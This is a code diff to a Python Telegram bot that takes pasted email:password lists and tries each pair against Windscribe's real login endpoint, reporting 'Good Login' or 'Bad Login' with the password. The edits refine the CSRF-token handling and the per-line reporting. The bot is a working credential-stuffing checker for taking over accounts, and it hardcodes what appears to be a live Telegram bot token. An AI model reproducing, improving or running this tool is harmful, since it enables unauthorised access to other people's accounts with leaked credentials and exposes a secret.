@@ -1,9 +1,7 @@
 from pyrogram import Client, filters
 import requests
-import requests,re
-import pyromod
-from pyrogram.types import Message
 import os
+from pyrogram.types import Message
 
 # Telegram bot token (replace with your bot token)
 BOT_TOKEN = "6909039567:AAFxWc8oVejhey2Y9hophG5__L72tjEQqw0"
@@ -14,25 +12,36 @@ app = Client("hma_bot", api_id=api_id, api_hash=api_hash, bot_token=BOT_TOKEN)
 
 def hma_login(email, password):
     try:
-    	url = "https://res.windscribe.com/res/logintoken"
-    	headers = {
-           "origin": "https://windscribe.com",
-           "priority": "u=1, i",
-           "referer": "https://windscribe.com/",
-           "sec-ch-ua": 'Not)A;Brand";v="99", "Brave";v="127", "Chromium";v="127"',
-           "sec-ch-ua-mobile": "?0", 
-           "sec-ch-ua-platform": "Windows",
-           "sec-fetch-dest": "empty",
-           "sec-fetch-mode": "cors", 
-           "sec-fetch-site": "same-site",
-           "sec-gpc": "1", 
-           "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" 
+        # Retrieve CSRF token and time
+        url = "https://res.windscribe.com/res/logintoken"
+        headers = {
+            "origin": "https://windscribe.com",
+            "referer": "https://windscribe.com/",
+            "sec-ch-ua": 'Not)A;Brand";v="99", "Brave";v="127", "Chromium";v="127"',
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": "Windows",
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-site",
+            "sec-gpc": "1",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
         }
-    	res_post = requests.post(url,headers=headers)
-    	csrf_token = res_post.text.split('csrf_token":"')[1].split('"')[0]
-    	csrf_time = res_post.text.split('csrf_time":')[1].split('}')[0]
-    	data = {"login":1,"upgrade":0,"csrf_time":csrf_time,"csrf_token":csrf_token,"username":user,"password":pasw,"code":""}
-    	res_login = requests.post("https://windscribe.com/login",data=data,headers=headers)
+        res_post = requests.post(url, headers=headers)
+        csrf_token = res_post.json().get('csrf_token', '')
+        csrf_time = res_post.json().get('csrf_time', '')
+        
+        # Attempt to log in
+        data = {
+            "login": 1,
+            "upgrade": 0,
+            "csrf_time": csrf_time,
+            "csrf_token": csrf_token,
+            "username": email,
+            "password": password,
+            "code": ""
+        }
+        res_login = requests.post("https://windscribe.com/login", data=data, headers=headers)
+        
         if "Account Overview" in res_login.text or "Account Status" in res_login.text:
             return True, "Login successful."
         else:
@@ -67,13 +76,12 @@ async def trans(client, m: Message):
                 success, message = hma_login(email, password)
                 if success:
                     result_message = f"Good Login for {email} : {password}"
-                    await app.send_message(m.chat.id, result_message)
                 else:
                     result_message = f"Bad Login for {email}: {password} - {message}"
             else:
                 result_message = f"Invalid line format: {line}"
-
             
+            await app.send_message(m.chat.id, result_message)
 
             # Update progress and send message if necessary
             if index + 1 >= next_progress_threshold:
